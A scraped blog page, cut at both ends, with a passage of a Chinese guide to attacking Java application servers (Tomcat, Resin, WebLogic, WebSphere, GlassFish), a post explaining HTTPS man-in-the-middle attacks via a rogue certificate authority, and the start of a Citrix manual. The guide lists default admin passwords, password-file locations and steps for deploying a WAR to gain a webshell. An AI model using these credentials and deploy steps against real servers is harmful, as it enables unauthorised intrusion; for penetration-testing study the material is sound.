<p>CVE 通用漏洞与披露: <a href="http://cve.scap.org.cn/cve_list.php?keyword=tomcat&amp;action=search&amp;p=1" target="_blank"><a href="http://cve.scap.org.cn/cve_list.php?keyword=tomcat&amp;action=search&amp;p=1">http://cve.scap.org.cn/cve_list.php?keyword=tomcat&amp;action=search&amp;p=1</a></a></p>
<p>Cvedetails ： <a href="http://www.cvedetails.com/product/887/Apache-Tomcat.html?vendor_id=45" target="_blank"><a href="http://www.cvedetails.com/product/887/Apache-Tomcat.html?vendor_id=45">http://www.cvedetails.com/product/887/Apache-Tomcat.html?vendor_id=45</a></a> <a href="http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/Apache-Tomcat.html" target="_blank"><a href="http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/Apache-Tomcat.html">http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/Apache-Tomcat.html</a></a></p>
<p>Sebug: <a href="http://sebug.net/appdir/Apache+Tomcat" target="_blank"><a href="http://sebug.net/appdir/Apache+Tomcat">http://sebug.net/appdir/Apache+Tomcat</a></a></p>
<h3 id="-tomcat-">怎样发现Tomcat有那些漏洞?</h3>
<p>1、通过默认的报错页面（404、500等）可以获取到Tomcat的具体版本，对照Tomcat漏洞。</p>
<p>2、利用WVS之类的扫描工具可以自动探测出对应的版本及漏洞。</p>
<h3 id="-tomcat-">怎样快速确定是不是Tomcat?</h3>
<p>请求响应为:Server:Apache-Coyote/1.1 就是tomcat了。</p>
<h3 id="tomcat-">Tomcat稀奇古怪的漏洞：</h3>
<p>Tomcat的安全问题被爆过非常多，漏洞统计图：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565085066.png" alt="enter image description here"></p>
<p>有一些有意思的漏洞，比如：Insecure default password CVE-2009-3548(影响版本: 6.0.0-6.0.20)</p>
<p>The Windows installer defaults to a blank password for the administrative user. If this is not changed during the install process, then by default a user is created with the name admin, roles admin and manager and a blank password.在windows安装版admin默认空密码漏洞，其实是用户安装可能偷懒，没有设置密码…</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565336054.png" alt="enter image description here"></p>
<p>这样的问题在tar.gz和zip包里面根本就不会存在。有些漏洞看似来势汹汹其实鸡肋得不行如：Unexpected file deletion in work directory CVE-2009-2902 都已经有deploy权限了，闹个啥。</p>
<p>Tomcat非常严重的漏洞（打开Tomcat security-5、6、7.html找）：
Important: Session fixation CVE-2013-2067 (6.0.21-6.0.36) Important: Denial of service CVE-2012-3544 (6.0.0-6.0.36) Important: Denial of service CVE-2012-2733 (6.0.0-6.0.35) Important: Bypass of security constraints CVE-2012-3546 (6.0.0-6.0.35) Important: Bypass of CSRF prevention filter CVE-2012-4431 (6.0.30-6.0.35) Important: Denial of service CVE-2012-4534 (6.0.0-6.0.35) Important: Information disclosure CVE-2011-3375 (6.0.30-6.0.33) Important: Authentication bypass and information disclosure CVE-2011-3190 (6.0.0-6.0.33) (………………………………………………….) Important: Directory traversal CVE-2008-2938 (6.0.18) Important: Directory traversal CVE-2007-0450 (6.0.0-6.0.9)</p>
<p>如果英文亚历山大的同学，对应的漏洞信息一般都能够在中文的sebug找到。</p>
<p>Sebug：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565448247.png" alt="enter image description here"></p>
<p>CVE 通用漏洞与披露：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565511192.png" alt="enter image description here"></p>
<h2 id="resin">Resin</h2>
<p>Resin是CAUCHO公司的产品，是一个非常流行的application server，对servlet和JSP提供了良好的支持，性能也比较优良，resin自身采用JAVA语言开发。</p>
<p>Resin比较有趣的是默认支持PHP! Resin默认通过Quercus 动态的去解析PHP文件请求。（Resin3也支持，详情：<a href="http://zone.wooyun.org/content/2467" target="_blank"><a href="http://zone.wooyun.org/content/2467">http://zone.wooyun.org/content/2467</a></a>）</p>
<h3 id="resin-">Resin版本</h3>
<p>Resin主流的版本是Resin3和Resin4，在文件结构上并没有多大的变化。Resin的速度和效率非常高，但是不知怎么Resin似乎对Quercus 更新特别多。</p>
<p>4.0.x版本更新详情：<a href="http://www.caucho.com/resin-4.0/changes/changes.xtp" target="_blank"><a href="http://www.caucho.com/resin-4.0/changes/changes.xtp">http://www.caucho.com/resin-4.0/changes/changes.xtp</a></a></p>
<p>3.1.x版本更新详情：<a href="http://www.caucho.com/resin-3.1/changes/changes.xtp" target="_blank"><a href="http://www.caucho.com/resin-3.1/changes/changes.xtp">http://www.caucho.com/resin-3.1/changes/changes.xtp</a></a></p>
<h3 id="resin-">Resin默认配置</h3>
<h3 id="1-resin-conf-resin-xml">1、resin.conf和resin.xml</h3>
<p>Tomcat和Rsin的核心配置文件都在conf目录下，Resin3.1.x 默认是resin.conf而4.0.x默认是resin.xml。resin.conf/resin.xml是Resin最主要配置文件，类似Tomcat的server.xml。</p>
<h3 id="1-">1&gt;数据源:</h3>
<p>第一节的时候有谈到resin数据源就是位于这个文件，搜索database（位于server标签内）即可定位到具体的配置信息。</p>
<h3 id="2-">2&gt;域名绑定</h3>
<p>搜索host即可定位到具体的域名配置，其中的root-directory是域名绑定的对应路径。很容易就能够找到域名绑定的目录了。</p>
<host id="javaweb.org" root-directory=".">       <host-alias-regexp>^([^/]/*).javaweb.org</host-alias-regexp>       <web-app id="/" root-directory="D:/web/xxxx/xxxx"/> </host>

<h3 id="resin-">Resin默认安全策略</h3>
<h3 id="1-">1&gt;管理后台访问权限</h3>
<p>Resin比较BT的是默认仅允许本机访问管理后台，这是因为在resin.conf当中默认配置禁止了外部IP请求后台。</p>
<resin:set var="resin_admin_external" value="false"/>

<p>修改为true外部才能够访问。</p>
<h3 id="2-resin-">2&gt;Resin后台管理密码</h3>
<p>Resin的管理员密码需要手动配置，在resin.conf/resin.xml当中搜索management。即可找到不过需要注意的是Resin的密码默认是加密的，密文是在登录页自行生成。比如admin加密后的密文大概会是：yCGkvrQHY7K8qtlHsgJ6zg== 看起来仅是base64编码不过不只是admin默认的Base64编码是：YWRtaW4= Resin,翻了半天Resin终于在文档里面找到了：<a href="http://www.caucho.com/resin-3.1/doc/resin-security.xtp" target="_blank"><a href="http://www.caucho.com/resin-3.1/doc/resin-security.xtp">http://www.caucho.com/resin-3.1/doc/resin-security.xtp</a></a></p>
<p>￼<img src="http://static.wooyun.org/20130922/2013092207565538887.png" alt="enter image description here"></p>
<p>虽说是MD5+Base64加密但是怎么看都有点不对，下载Resin源码找到加密算法：
package com.caucho.server.security.PasswordDigest</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565634855.png" alt="enter image description here"></p>
<p>这加密已经没法反解了，所以就算找到Resin的密码配置文件应该也没法破解登录密码。事实上Resin3的管理后台并没有其他Server（相对JBOSS和Weblogic）那么丰富。而Resin4的管理后台看上去更加有趣。</p>
<p>Resin4的加密方式和Resin3还不一样改成了SSHA：
admin_user : admin admin_password : {SSHA}XwNZqf8vxNt5BJKIGyKT6WMBGxV5OeIi</p>
<p>详情：<a href="http://www.caucho.com/resin-4.0/admin/security.xtp" target="_blank"><a href="http://www.caucho.com/resin-4.0/admin/security.xtp">http://www.caucho.com/resin-4.0/admin/security.xtp</a></a></p>
<p>Resin3：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565648659.png" alt="enter image description here"></p>
<p>Resin4：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565652431.png" alt="enter image description here"></p>
<h3 id="resin-webshell">Resin获取WebShell</h3>
<p>As of Resin 4.0.0, it is now possible to deploy web applications remotely to a shared repository that is distributed across the cluster. This feature allows you to deploy once to any triad server and have the application be updated automatically across the entire cluster. When a new dynamic server joins the cluster, the triad will populate it with these applications as well.</p>
<p>Web Deploy war文件大概是从4.0.0开始支持的，不过想要在Web deploy一个应用也不是一件简单的事情，首先得先进入后台。然后还得以Https方式访问。不过命令行下部署就没那没法麻烦。Resin3得手动配置web-app-deploy。 最简单的但又不爽办法就是想办法把war文件上传到resin-pro-3.1.13webapps目录下，会自动部署（就算Resin已启动也会自动部署，不影响已部署的应用）。</p>
<p>Resin3部署详情：<a href="http://www.caucho.com/resin-3.1/doc/webapp-deploy.xtp" target="_blank"><a href="http://www.caucho.com/resin-3.1/doc/webapp-deploy.xtp">http://www.caucho.com/resin-3.1/doc/webapp-deploy.xtp</a></a></p>
<p>Resin4部署War文件详情：<a href="http://www.caucho.com/resin-4.0/admin/deploy.xtp" target="_blank"><a href="http://www.caucho.com/resin-4.0/admin/deploy.xtp">http://www.caucho.com/resin-4.0/admin/deploy.xtp</a></a></p>
<p>Resin4进入后台后选择Deploy,不过还得用SSL方式请求。Resin要走一个”非加密通道”。</p>
<p>To deploy an application remotely: log into the resin-admin console on any triad server. Make sure you are connecting over SSL, as this feature is not available over a non-encrypted channel. Browse to the &quot;webapp&quot; tab of the resin-admin server and at the bottom of the page, enter the virtual host, URL, and local .war file specifying the web application, then press &quot;Deploy&quot;. The application should now be deployed on the server. In a few moments, all the servers in the cluster will have the webapp.</p>
<p>￼<img src="http://static.wooyun.org/20130922/2013092207565886704.png" alt="enter image description here"></p>
<p>Resin4敢不敢再没节操点？默认HTTPS是没有开的。需要手动去打开:
conf</p>
<p>esin.properties</p>
<p>/# https : 8443</p>
<p>默认8443端口是关闭的，取消这一行的注释才能够使用HTTPS方式访问后台才能够Web Deploy war。</p>
<p><img src="http://static.wooyun.org/20130922/2013092207565974737.png" alt="enter image description here"></p>
<p>部署成功访问: <a href="http://localhost:8080/GetShell/Customize.jsp" target="_blank"><a href="http://localhost:8080/GetShell/Customize.jsp">http://localhost:8080/GetShell/Customize.jsp</a></a> 即可获取WebShell。</p>
<h3 id="resin-">Resin漏洞</h3>
<p>Resin相对Tomcat的安全问题来说少了很多，Cvedetails上的Resin的漏洞统计图：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570077272.png" alt="enter image description here"></p>
<p>Cvedetails统计详情： <a href="http://www.cvedetails.com/product/993/Caucho-Technology-Resin.html?vendor_id=576" target="_blank"><a href="http://www.cvedetails.com/product/993/Caucho-Technology-Resin.html?vendor_id=576">http://www.cvedetails.com/product/993/Caucho-Technology-Resin.html?vendor_id=576</a></a></p>
<p>Cvedetails漏洞详情： <a href="http://www.cvedetails.com/vulnerability-list/vendor_id-576/product_id-993/Caucho-Technology-Resin.html" target="_blank"><a href="http://www.cvedetails.com/vulnerability-list/vendor_id-576/product_id-993/Caucho-Technology-Resin.html">http://www.cvedetails.com/vulnerability-list/vendor_id-576/product_id-993/Caucho-Technology-Resin.html</a></a></p>
<p>CVE 通用漏洞与披露： <a href="http://cve.scap.org.cn/cve_list.php?keyword=resin&amp;action=search&amp;p=1" target="_blank"><a href="http://cve.scap.org.cn/cve_list.php?keyword=resin&amp;action=search&amp;p=1">http://cve.scap.org.cn/cve_list.php?keyword=resin&amp;action=search&amp;p=1</a></a></p>
<p>Resin3.1.3:</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570023914.png" alt="enter image description here"></p>
<p>Fixed BugList: <a href="http://bugs.caucho.com/changelog_page.php" target="_blank"><a href="http://bugs.caucho.com/changelog_page.php">http://bugs.caucho.com/changelog_page.php</a></a></p>
<h2 id="weblogic">Weblogic</h2>
<p>WebLogic是美国bea公司出品的一个application server确切的说是一个基于Javaee架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h3 id="weblogic-">Weblogic版本</h3>
<p>Oracle简直就是企业应用软件终结者，收购了Sun那个土鳖、Mysql、BAE Weblogic等。BAE在2008初被收购后把BAE终结在Weblogic 10。明显的差异应该是从10.x开始到最新的12c。这里主要以Weblogic9.2和最新的Weblogic 12c为例。</p>
<h3 id="weblogic-">Weblogic默认配置</h3>
<p>Weblogic默认端口是7001，Weblogic10g-12c默认的管理后台是：<a href="http://localhost:7001/console" target="_blank">http://localhost:7001/console</a></p>
<p>Weblogic10 以下默认后台地址是：<a href="http://192.168.80.1:7001/console/login/LoginForm.jsp" target="_blank">http://192.168.80.1:7001/console/login/LoginForm.jsp</a></p>
<p>管理帐号是在建立Weblogic域的时候设置的。</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570148196.png" alt="enter image description here"></p>
<p>Weblogic控制台：</p>
<p><a href="http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/09/java7-18.png" target="_blank">enter link description here</a></p>
<p>Weblogic10以下默认管理帐号:weblogic密码：weblogic。关于Weblogic10++的故事还得从建域开始，默认安装完Weblogic后需要建立一个域。</p>
<h3 id="weblogic-">WebLogic中的&quot;域&quot;?</h3>
<p>域环境下可以多个 WebLogic Server或者WebLogic Server 群集。域是由单个管理服务器管理的 WebLogic Server实例的集合。 Weblogic10++域默认是安装完成后由用户创建。帐号密码也在创建域的时候设置，所以这里并不存在默认密码。当一个域创建完成后配置文件和Web应用在：Weblogic12user_projectsdomains”域名”。</p>
<h3 id="weblogic-">Weblogic 默认安全策略</h3>
<h3 id="1-weblogic-">1、Weblogic默认密码文件:</h3>
<p>Weblogic 9采用的3DES（三重数据加密算法）加密方式，Weblogic 9默认的管理密码配置文件位于：
weblogic_9weblogic92samplesdomainswl_serverserversexamplesServersecurityoot.properties</p>
<h3 id="boot-properties-">boot.properties：</h3>
<p>/# Generated by Configuration Wizard on Sun Sep 08 15:43:13 GMT 2013 username={3DES}fy709SQ4pCHAFk+lIxiWfw== password={3DES}fy709SQ4pCHAFk+lIxiWfw==</p>
<p>Weblogic 12c采用了AES对称加密方式，但是AES的key并不在这文件里面。默认的管理密码文件存放于：</p>
<p>Weblogic12user_projectsdomainsase_domainserversAdminServersecurityoot.properties</p>
<p>(base_domain是默认的”域名”)。</p>
<h3 id="boot-properties-">boot.properties：</h3>
<p>boot.properties： /# Generated by Configuration Wizard on Tue Jul 23 00:07:09 CST 2013 username={AES}PsGXATVgbLsBrCA8hbaKjjA91yNDCK78Z84fGA/pTJE= password={AES}Z44CPAl39VlytFk1I5HUCEFyFZ1LlmwqAePuJCwrwjI=</p>
<p>怎样解密Weblogic密码?</p>
<p>Weblogic 12c：
Weblogic12user_projectsdomainsase_domainsecuritySerializedSystemIni.dat</p>
<p>Weblogic 9：</p>
<p>weblogic_9weblogic92samplesdomainswl_serversecuritySerializedSystemIni.dat</p>
<p>解密详情：<a href="http://drops.wooyun.org/tips/349" target="_blank"><a href="http://drops.wooyun.org/tips/349">http://drops.wooyun.org/tips/349</a></a> 、<a href="http://www.blogjava.net/midea0978/archive/2006/09/07/68223.html" target="_blank"><a href="http://www.blogjava.net/midea0978/archive/2006/09/07/68223.html">http://www.blogjava.net/midea0978/archive/2006/09/07/68223.html</a></a></p>
<h3 id="2-weblogic-jndi-">2、Weblogic数据源(JNDI)</h3>
<p>Weblogic如果有配置数据源，那么默认数据源配置文件应该在：
Weblogic12user_projectsdomainsase_domainconfigconfig.xml</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570229732.png" alt="enter image description here"></p>
<h3 id="weblogic-webshell-">Weblogic获取Webshell ￼</h3>
<p><img src="http://static.wooyun.org/20130922/2013092207570425118.png" alt="enter image description here"></p>
<p>Weblogic 9 GetShell： <a href="http://drops.wooyun.org/tips/402" target="_blank"><a href="http://drops.wooyun.org/tips/402">http://drops.wooyun.org/tips/402</a></a></p>
<h2 id="websphere">Websphere</h2>
<p>WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。</p>
<h3 id="websphere-">Websphere版本</h3>
<p>Websphere现在主流的版本是6-7-8，老版本的5.x部分老项目还在用。GetShell大致差不多。6、7测试都有“默认用户标识admin登录”，Websphere安装非常麻烦，所以没有像之前测试Resin、Tomcat那么细测。</p>
<h3 id="websphere-">Websphere默认配置</h3>
<p>默认的管理后台地址（注意是HTTPS）： <a href="https://localhost:9043/ibm/console/logon.jsp" target="_blank"><a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a></a></p>
<p>默认管理密码：
1、admin (测试websphere6-7默认可以直接用admin作为用户标识登录，无需密码) 2、websphere/ websphere 3、system/ manager</p>
<p>默认端口：</p>
<p>管理控制台端口 9060 管理控制台安全端口 9043 HTTP传输端口 9080 HTTPS传输端口 9443 引导程序端口 2809 SIP端口 5060 SIP安全端口 5061 SOAP连接器端口 8880 SAS SSL ServerAuth端口 9401 CSIV2 ServerAuth 侦听器端口 9403 CSIV2 MultiAuth 侦听器端口 9402 ORB侦听器端口 9100 高可用性管理通讯端口(DCS) 9353 服务集成端口 7276 服务集成安全端口 7286 服务集成器MQ互操作性端口 5558 服务集成器MQ互操作性安全端口 5578</p>
<p>8.5安装的时候创建密码： ￼</p>
<p><a href="http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/09/java7-21.png" target="_blank">enter link description here</a></p>
<p>Websphere8.5启动信息：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570520692.png" alt="enter image description here"></p>
<p>Websphere8.5登录页面： <a href="https://localhost:9043/ibm/console/logon.jsp" target="_blank">https://localhost:9043/ibm/console/logon.jsp</a></p>
<p><a href="http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/09/java7-23.png" target="_blank">enter link description here</a></p>
<p>Websphere8.5 WEB控制台：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570682427.png" alt="enter image description here"></p>
<p>Websphere6-7默认控制台地址也是： <a href="http://localhost:9043/ibm/console，此处用admin登录即可。" target="_blank">http://localhost:9043/ibm/console，此处用admin登录即可。</a></p>
<p><img src="http://static.wooyun.org/20130922/2013092207570786132.jpeg" alt="enter image description here"></p>
<h3 id="websphere-getshell">Websphere GetShell</h3>
<p>本地只安装了8.5测试，Websphere安装的确非常坑非常麻烦。不过Google HACK到了其余两个版本Websphere6和Websphere7。测试发现Websphere GetShell一样很简单，只是比较麻烦，一般情况直接默认配置Next就行了。Websphere7和Websphere8 GetShell基本一模一样。</p>
<h3 id="websphere6-getshell">Websphere6 GetShell</h3>
<p>需要注意的是Websphere6默认支持的Web应用是2.3(web.xml配置的web-app_2_3.dtd)直接上2.5是不行的，请勿霸王硬上弓。其次是在完成部署后记得保存啊亲，不然无法生效。</p>
<p><img src="http://static.wooyun.org/20130922/2013092207570894698.png" alt="enter image description here"></p>
<h3 id="websphere8-5-getshell">Websphere8.5 GetShell</h3>
<p>部署的时候记得写上下文名称哦，不让无法请求到Shell。</p>
<p><img src="http://static.wooyun.org/20130922/2013092207571078345.png" alt="enter image description here"></p>
<p>注意：</p>
<p>如果在Deploy低版本的Websphere的时候可能会提示web.xml错误，这里其实是因为支持的JavaEE版本限制，把war包里面的web.xml改成低版本就行了，如把app2.5改成2.3。
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;<a href="http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;" target="_blank">http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</a> <web-app>     <welcome-file-list>         <welcome-file>index.jsp</welcome-file>     </welcome-file-list> </web-app></p>
<h2 id="glassfish">GlassFish</h2>
<p>GlassFish是SUN的产品，但是作为一只优秀的土鳖SUN已经被Oracle收购了，GlassFish的性能优越对JavaEE的支持自然最好，最新的Servlet3.1仅GlassFish支持。</p>
<h3 id="glassfish-">GlassFish版本</h3>
<p>GlassFish版本比较低调，最高版本GlassFish4可在官网下载： <a href="http://glassfish.java.net/" target="_blank">http://glassfish.java.net/</a> 。最新4.x版刚发布不久。所以主流版本应当还是v2-3,3应该更多。支持php(v3基于Quercus),jRuby on Rails 和 Phobos等多种语言。</p>
<h3 id="glassfish-">GlassFish 默认配置</h3>
<p>默认Web控制后台： <a href="http://localhost:4848" target="_blank">http://localhost:4848</a></p>
<p>默认管理密码： GlassFish2默认帐号admin密码adminadmin 。</p>
<p>GlassFish3、4 如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。
Configuration Error Secure Admin must be enabled to access the DAS remotely.</p>
<p>默认端口：</p>
<p>使用Admin的端口 4848。 使用HTTP Instance的端口 8080。 使用JMS的端口 7676。 使用IIOP的端口 3700。 使用HTTP_SSL的端口 8181。 使用IIOP_SSL的端口 3820。 使用IIOP_MUTUALAUTH的端口 3920。 使用JMX_ADMIN的端口 8686。 使用OSGI_SHELL的默认端口 6666。 使用JAVA_DEBUGGER的默认端口 9009。</p>
<p>默认数据源：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207571075980.png" alt="enter image description here"></p>
<h3 id="glassfish-getshell-">GlassFish GetShell ￼</h3>
<p><img src="http://static.wooyun.org/20130922/2013092207571142727.png" alt="enter image description here"></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 22:24:15"datetime="2014-03-29 22:24:15"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Java--攻击JavaWeb应用7-Server篇1/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Java--攻击JavaWeb应用7-Server篇1" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">破解Google Gmail的https新思路</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-google-gmail-https-">破解Google Gmail的https新思路</h1>
<p>最近，Google针对<a href="http://www.williamlong.info/archives/2053.html" target="_blank">Gmail被攻击事件</a>，全面默认启用了始终以https访问Gmail的方式了。但是，对于可以动用整个国家力量的黑客来说，从网络通讯数据中（在此不讨论对用户电脑种木马破解https的情况，只讨论在网络通讯数据中破解https的方法）破解https除了暴力破解（暴力破解https即使按照现在的集群计算能力仍旧需要几百至几万年不等）之外真的别无他法了吗？事实并非如此。</p>
<p>我们知道，https的安全性主要是由SSL证书中的公钥和私钥来保证的。浏览器与服务器经过https建立通讯的时候（不考虑SSL代理方式需要用户提交证书的情况，因为我们现在讨论的是浏览器访问网站，和SSL代理无关）会按照以下步骤保证通讯的安全性：</p>
<p>1、浏览器连接服务器，服务器把SSL证书的公钥发送给浏览器</p>
<p>2、浏览器验证此证书中的域是否和访问的域一致（比如用户访问<a href="https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期" target="_blank">https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期</a></p>
<p>3、如果浏览器验证失败，浏览器通知用户证书有问题，让用户选择是否继续</p>
<p>4、如果浏览器验证成功，那么浏览器随机生成一个对称密钥并使用接收到的SSL证书的公钥进行加密并发送给服务器</p>
<p>5、服务器通过SSL证书的私钥对收到的信息进行解密并得到浏览器随机生成的对称密钥</p>
<p>6、最后服务器和浏览器都通过这个对称密钥进行通讯了（为什么不直接使用公钥和私钥进行通讯？因为非对称加密比对称加密效率低）</p>
<p>这个方案看似完美，却无法抵御中间人攻击，攻击者可以按以下步骤实施攻击截取https通讯中的所有数据：</p>
<p>1、攻击者伪造一个Gmail的SSL证书，使其中的域为mail.google.com或/*.google.com，并设置合适的证书过期时间</p>
<p>2、攻击者等待访问者的浏览器访问Gmail时，通过DNS劫持或IP伪造（对于有路由器控制权限的黑客来说简直轻而易举）的方法使其访问到攻击者的服务器上</p>
<p>3、攻击者把伪造的SSL证书公钥发送给浏览器</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，认为访问到的就是Gmail本身，从而把对称密钥发送给黑客服务器</p>
<p>5、黑客服务器把伪造的Gmail网页通过收到的对称密钥加密后发送给浏览器</p>
<p>6、访问者通过浏览器输入Gmail帐户，发送给黑客服务器，黑客服务器通过收到的对称密钥解密后成功获得访问者的Gmail密码</p>
<p>为了抵御这种中间人攻击，SSL证书需要由可信的SSL证书颁发机构颁发，形成一个证书链（比如Gmail的证书链为：最底层为网域mail.google.com，上一层为Thawte SGC CA证书颁发机构，最顶层为很有名的VeriSign证书颁发机构）。那么，浏览器除了需要验证域和有效期外，还要检查证书链中的上级证书公钥是否有效，上级的上级证书公钥是否有效，直至根证书公钥为止。这样就可以有效避免中间人攻击了，因为根证书公钥都是预装在操作系统中的，黑客如果不是暴力破解，无法得到根证书的私钥，如果黑客自己生成一个私钥，浏览器验证根证书公钥的时候发现无法通过操作系统中预装的公钥加密数据后使用这个私钥进行解密，从而判定这个公钥是无效的。这个方案也是现在https通讯通常的方案。</p>
<p>那么，这个现在所有的浏览器正在使用的https通讯方案就无懈可击了吗？答案仍是否定的。我们可以看到，在后一个方案中，https的安全性需要在证书颁发机构公信力的强有力保障前提下才能发挥作用。如果证书颁发机构在没有验证黑客为mail.google.com的持游者的情况下，给黑客颁发了网域为mail.google.com的证书，那么黑客的中间人攻击又可以顺利实施：</p>
<p>1、攻击者从一家不验证mail.google.com持有者的SSL证书颁发机构WoSign那里得到了网域为mail.google.com的证书，此证书的证书链为：最底层为网域mail.google.com，上一层证书颁发机构为WoSign，顶层证书颁发机构为VeriSign</p>
<p>2/3、第二、第三个步骤同上一个方案的中间人攻击的第二、第三个步骤</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，继续验证证书链：</p>
<p>4.1、最底层的网域mail.google.com证书公钥不在操作系统中，无法验证其访问到的就是Gmail本身，继续验证上一层证书颁发机构</p>
<p>4.2、上一层证书颁发机构WoSign的公钥也不在操作系统中，仍旧无法验证其有效性，继续验证上一层证书颁发机构</p>
<p>4.3、浏览器看到顶层证书颁发机构VeriSign的公钥在操作系统中，认为证书链有效，从而把对称密钥发送给黑客服务器</p>
<p>5/6、第五、第六个步骤同上一个方案的中间人攻击的第五、第六个步骤。黑客成功获得访问者的Gmail密码</p>
<p>然而，不验证域名持有者就颁发证书的情况在国外几乎不会发生，但是在国内就不一定了。针对破解目标，国内证书颁发机构WoSign（在此只是举例国内比较有名的证书颁发机构WoSign，并不代表WoSign今后一定会这么做）很有可能为了上级要求颁发了证书给非域名持有者的黑客，从而使得破解目标的Gmail密码被黑客截取。</p>
<p>那么，国内的破解目标是不是使用https的Gmail也无法保证安全了呢？欢迎与我进行探讨。
来源： <a href="[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)">[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)</a> </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--破解GoogleGmail的https新思路" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-虚拟化_Citrix--Resource_Manager_Guide/">Resource_Manager_Guide</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:37.000Z"> <a href="/2014/02/02/2014-02-02-虚拟化_Citrix--Resource_Manager_Guide/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="resource_manager_guide">Resource_Manager_Guide</h1>
<p>Resource Manager Administrator’s Guide
For other guides in this document set, go to the Document Center
Resource Manager for MetaFrame® Presentation Server Citrix® MetaFrame® Presentation Server 3.0, Enterprise Edition for Windows Citrix® MetaFrame® Access Suite
Use of the product documented in this guide is subject to your prior acceptance of the End User License Agreement. Note that copies of the End User License Agreement are included in the root directory of the MetaFrame XP Server CD-ROM and in the root directory of the Components CD-ROM. Information in this document is subject to change without notice. Companies, names, and data used in examples herein are fictitious unless otherwise noted. Other than printing one copy for personal use, no part of this document may be reproduced or transmitted in any form or by any means, electronic or mechanical, for any purpose, without the express written permission of Citrix Systems, Inc. Copyright © 2004 Citrix Systems, Inc. All rights reserved. Citrix, ICA (Independent Computing Architecture), and WinFrame are registered trademarks, and Citrix Solutions Network, MetaFrame, MetaFrame XP, NFuse, Program Neighborhood, and SpeedScreen are trademarks of Citrix Systems, Inc. in the United States and other countries. RSA Encryption © 1996-1997 RSA Security Inc., All Rights Reserved. Adobe, Acrobat, and PostScript are trademarks or registered trademarks of Adobe Systems Incorporated in the U.S. and/or other countries. DB2 is a registered trademark and PowerPC is a trademark of International Business Machines Corp. in the U.S. and other countries. HP OpenView is a trademark of the Hewlett-Packard Company. Microsoft, MS-DOS, Windows, Windows NT, Win32, Outlook, ActiveX, and Active Directory are either registered trademarks or trademarks of Microsoft Corp. in the United States and/or other countries. Tivoli and 